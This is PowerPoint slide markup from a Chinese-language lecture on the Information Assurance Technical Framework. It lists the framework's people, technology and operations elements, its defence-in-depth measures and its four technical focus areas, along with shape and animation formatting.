      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="20" name="直接箭头连接符 19"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7380312" y="3676620"/>
            <a:ext cx="725987" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="38100">
            <a:solidFill>
              <a:srgbClr val="0066FF"/>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8007020" y="2884532"/>
            <a:ext cx="803425" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>技术</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="矩形 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8017046" y="3424406"/>
            <a:ext cx="803425" cy="461665"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0">
                <a:latin typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
                <a:ea typeface="方正大黑简体" panose="03000509000000000000" pitchFamily="65" charset="-122"/>
              </a:rPr>
              <a:t>操作</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="25" name="直接箭头连接符 24"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7380311" y="3100556"/>
            <a:ext cx="725987" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="38100">
            <a:solidFill>
              <a:srgbClr val="0066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66727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0114">
                                            <p:txEl>
                                              <p:pRg st="0" end="0"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="7" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="901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011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0114">
                                            <p:txEl>
                                              <p:pRg st="1" end="1"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="11" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="9011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011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0114">
                                            <p:txEl>
                                              <p:pRg st="2" end="2"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="15" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="9011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011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0114">
                                            <p:txEl>
                                              <p:pRg st="3" end="3"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="19" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="9011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011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0114">
                                            <p:txEl>
                                              <p:pRg st="4" end="4"/>
                                            </p:txEl>
                                          </p:spTgt>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="23" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="9011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011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ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="36" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="18"/>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fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="25"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="4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500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="20"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="46" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="20"/>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500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="19"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="5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 calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="55" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="2"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="5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gtEl>
                                        <p:attrNameLst>
                                          <p:attrName>style.visibility</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:to>
                                        <p:strVal val="visible"/>
                                      </p:to>
                                    </p:set>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="61" dur="500" fill="hold"/>
                                        <p:tgtEl>
                                          <p:spTgt spid="3"/>
                                        </p:tgtEl>
                                        <p:attrNameLst>
                                          <p:attrName>ppt_x</p:attrName>
                                        </p:attrNameLst>
                                      </p:cBhvr>
                                      <p:tavLst>
                                        <p:tav tm="0">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                        <p:tav tm="100000">
                                          <p:val>
                                            <p:strVal val="#ppt_x"/>
                                          </p:val>
                                        </p:tav>
                                      </p:tavLst>
                                    </p:anim>
                                    <p:anim calcmode="lin" valueType="num">
                                      <p:cBhvr additive="base">
                                        <p:cTn id="6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build="p"/>
      <p:bldP spid="2" grpId="0"/>
      <p:bldP spid="3" grpId="0"/>
      <p:bldP spid="18" grpId="0"/>
      <p:bldP spid="1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745858"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>I</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ATF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>三要素</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="5" name="Group 397"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="507465856"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="755576" y="1628800"/>
          <a:ext cx="7272809" cy="4196063"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="2137507">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20000"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2824228">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20001"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2311074">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="20002"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="353494">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2800" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                          <a:ln>
                            <a:noFill/>
                          </a:ln>
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:effectLst>
                            <a:outerShdw blurRad="38100" dist="38100" dir="2700000" algn="tl">
                              <a:srgbClr val="FFFFFF"/>
                            </a:outerShdw>
                          </a:effectLst>
                          <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                          <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
                        </a:rPr>
                        <a:t>人员</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2800" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                          <a:ln>
                            <a:noFill/>
                          </a:ln>
                          <a:solidFill>
                            <a:srgbClr val="0066FF"/>
                          </a:solidFill>
                          <a:effectLst>
                            <a:outerShdw blurRad="38100" dist="38100" dir="2700000" algn="tl">
                              <a:srgbClr val="FFFFFF"/>
                            </a:outerShdw>
                          </a:effectLst>
                          <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                          <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
                        </a:rPr>
                        <a:t>技术</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2800" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                          <a:ln>
                            <a:noFill/>
                          </a:ln>
                          <a:solidFill>
                            <a:srgbClr val="0066FF"/>
                          </a:solidFill>
                          <a:effectLst>
                            <a:outerShdw blurRad="38100" dist="38100" dir="2700000" algn="tl">
                              <a:srgbClr val="FFFFFF"/>
                            </a:outerShdw>
                          </a:effectLst>
                          <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                          <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
                        </a:rPr>
                        <a:t>操作</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809887">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培训</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深度防御技术框架域</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分析</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1"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="859301">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意识</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dirty="0">
                          <a:ln>
                            <a:noFill/>
                          </a:ln>
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                          <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
                        </a:rPr>
                        <a:t>安全标准</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dirty="0">
                          <a:ln>
                            <a:noFill/>
                          </a:ln>
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                          <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
                        </a:rPr>
                        <a:t>监视</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809887">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物理安全</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dirty="0">
                          <a:ln>
                            <a:noFill/>
                          </a:ln>
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                          <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
                        </a:rPr>
                        <a:t>获得</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr kumimoji="0" lang="en-US" altLang="zh-CN" sz="1800" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                          <a:ln>
                            <a:noFill/>
                          </a:ln>
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                          <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
                        </a:rPr>
                        <a:t>IA/TA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入侵检测</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3"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="666470">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人员安全</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风险分析</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警告</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4"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="666470">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dirty="0">
                          <a:ln>
                            <a:noFill/>
                          </a:ln>
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                          <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
                        </a:rPr>
                        <a:t>系统安全管理</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CC272"/>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dirty="0">
                          <a:ln>
                            <a:noFill/>
                          </a:ln>
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                          <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
                        </a:rPr>
                        <a:t>证书与鉴别</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CC272"/>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dirty="0">
                          <a:ln>
                            <a:noFill/>
                          </a:ln>
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:effectLst/>
                          <a:latin typeface="黑体" pitchFamily="2" charset="-122"/>
                          <a:ea typeface="黑体" pitchFamily="2" charset="-122"/>
                        </a:rPr>
                        <a:t>恢复</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CC272"/>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459338"/>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755650" y="668926"/>
            <a:ext cx="6513512" cy="487363"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>IATF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>的安全需求划分</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="92163" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="467544" y="1295400"/>
            <a:ext cx="7969250" cy="2235660"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2400" dirty="0"/>
              <a:t>IATF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
              <a:t>定义了四个主要的技术焦点领域：</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0"/>
              <a:t>本地计算环境</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0"/>
              <a:t>区域边界</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0"/>
              <a:t>网络和基础设施</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2200" dirty="0"/>
              <a:t>支撑性基础设施</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="5" name="Group 2"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="5796137" y="1700808"/>
            <a:ext cx="2514270" cy="2091903"/>
            <a:chOff x="930" y="164"/>
            <a:chExt cx="4173" cy="3214"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="6" name="AutoShape 3"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="930" y="2840"/>
              <a:ext cx="272" cy="18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26 w 21600"/>
                <a:gd name="T13" fmla="*/ 4535 h 21600"/>
                <a:gd name="T14" fmla="*/ 17074 w 21600"/>
                <a:gd name="T15" fmla="*/ 17065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100" b="1"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="7" name="Gear"/>
            <p:cNvSpPr>
              <a:spLocks noEditPoints="1" noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3651" y="164"/>
              <a:ext cx="1224" cy="127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6 w 21600"/>
                <a:gd name="T13" fmla="*/ 3963 h 21600"/>
                <a:gd name="T14" fmla="*/ 17841 w 21600"/>
                <a:gd name="T15" fmla="*/ 17637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chemeClr val="folHlink"/>
            </a:solidFill>
            <a:ln w="9525">
              <a:round/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:scene3d>
              <a:camera prst="legacyObliqueTopRight"/>
              <a:lightRig rig="legacyFlat3" dir="b"/>
            </a:scene3d>
            <a:sp3d extrusionH="430200" prstMaterial="legacyMatte">
              <a:bevelT w="13500" h="13500" prst="angle"/>
              <a:bevelB w="13500" h="13500" prst="angle"/>
              <a:extrusionClr>
                <a:schemeClr val="folHlink"/>
              </a:extrusionClr>
            </a:sp3d>
          </p:spPr>
          <p:txBody>
            <a:bodyPr>
              <a:flatTx/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1100" b="1"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="8" name="AutoShape 5"/>
            <p:cNvSpPr>
              <a:spLocks noEditPoints="1" noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1337" y="482"/>
              <a:ext cx="1429" cy="138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68 w 21600"/>
                <a:gd name="T13" fmla="*/ 3965 h 21600"/>
                <a:gd name="T14" fmla="*/ 17836 w 21600"/>
                <a:gd name="T15" fmla="*/ 17635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chemeClr val="accent2"/>
            </a:solidFill>
            <a:ln w="9525">
              <a:round/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:scene3d>
              <a:camera prst="legacyObliqueTopRight"/>
              <a:lightRig rig="legacyFlat3" dir="b"/>
            </a:scene3d>
            <a:sp3d extrusionH="430200" prstMaterial="legacyMatte">
              <a:bevelT w="13500" h="13500" prst="angle"/>
              <a:bevelB w="13500" h="13500" prst="angle"/>
              <a:extrusionClr>
                <a:schemeClr val="accent2"/>
              </a:extrusionClr>
            </a:sp3d>
          </p:spPr>
          <p:txBody>
            <a:bodyPr>
              <a:flatTx/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1100" b="1"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="9" name="AutoShape 6"/>
            <p:cNvSpPr>
              <a:spLocks noEditPoints="1" noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2562" y="1071"/>
              <a:ext cx="1588" cy="158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80 w 21600"/>
                <a:gd name="T13" fmla="*/ 3961 h 21600"/>
                <a:gd name="T14" fmla="*/ 17846 w 21600"/>
                <a:gd name="T15" fmla="*/ 17639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chemeClr val="tx2"/>
            </a:solidFill>
            <a:ln w="9525">
              <a:round/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
            <a:scene3d>
              <a:camera prst="legacyObliqueTopRight"/>
              <a:lightRig rig="legacyFlat3" dir="b"/>
            </a:scene3d>
            <a:sp3d extrusionH="430200" prstMaterial="legacyMatte">
              <a:bevelT w="13500" h="13500" prst="angle"/>
              <a:bevelB w="13500" h="13500" prst="angle"/>
              <a:extrusionClr>
                <a:schemeClr val="tx2"/>
              </a:extrusionClr>
            </a:sp3d>
          </p:spPr>
          <p:txBody>
            <a:bodyPr>
              <a:flatTx/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1100" b="1"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="10" name="Oval 7"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1655" y="799"/>
              <a:ext cx="816" cy="771"/>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altLang="zh-CN" sz="1100" b="1" dirty="0"/>
                <a:t> </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1100" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="CC0000"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>边界区域</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="11" name="Oval 8"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3923" y="482"/>
              <a:ext cx="726" cy="68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altLang="zh-CN" sz="1100" b="1" dirty="0"/>
                <a:t> </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1100" b="1" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="CC0000"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>计算环境</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="12" name="Oval 9"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2925" y="1434"/>
              <a:ext cx="907" cy="908"/>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altLang="zh-CN" sz="1100" b="1"/>
                <a:t> </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1100" b="1">
                  <a:solidFill>
                    <a:srgbClr val="CC0000"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>网络和</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="ctr"/>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-US" sz="1100" b="1">
                  <a:solidFill>
                    <a:srgbClr val="CC0000"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>基础设施</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="13" name="AutoShape 10"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1474"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14" name="AutoShape 11"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1837"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15" name="AutoShape 12"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2199"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16" name="AutoShape 13"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2562"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17" name="AutoShape 14"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2925"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18" name="AutoShape 15"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3288"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19" name="AutoShape 16"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3651"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20" name="AutoShape 17"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4014"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21" name="AutoShape 18"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4377"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22" name="AutoShape 19"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
